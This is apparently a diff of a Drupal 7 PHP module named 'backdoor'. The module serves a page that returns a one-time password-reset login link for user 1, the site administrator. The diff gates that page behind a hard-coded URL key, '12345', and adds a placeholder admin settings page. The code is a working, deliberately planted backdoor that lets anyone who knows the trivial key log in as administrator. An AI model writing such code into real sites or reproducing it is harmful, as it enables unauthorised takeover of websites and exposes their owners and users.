@@ -1,10 +1,5 @@
 <?php
 
-//function backdoor_init (){
-//	$user = user_load(1);
-//	print user_pass_reset_url($user);
-//}
-
 function backdoor_menu(){
 	$items = array();
 
@@ -12,14 +7,34 @@ function backdoor_menu(){
 		'title' => 'Backdoor page',
 		'description' => 'Here generating one time link for login',
 		'page callback' => 'backdoor',
-		'access arguments' => array('access content'),
+		'access callback' => 'access_backdoor_page',
+		'type' => MENU_NORMAL_ITEM,
+	);
+
+	$items['admin/config/administration/backdoor'] = array(
+		'title' => 'Backdoor settings',
+		'description' => 'Администрирование модуля Backdoor',
+		'page callback' => 'admin_page_backdoor',
+		'access arguments' => array('administer site configuration'),
 		'type' => MENU_NORMAL_ITEM,
 	);
 
 	return $items;
 }
 
+function access_backdoor_page (){
+	if(isset($_GET['key'])){
+		if($_GET['key'] == '12345'){
+			return TRUE;
+		}
+	}
+}
+
 function backdoor (){
 	$user = user_load(1);
-	print user_pass_reset_url($user);
+	return user_pass_reset_url($user);
+}
+
+function admin_page_backdoor (){
+	return t("Test");
 }
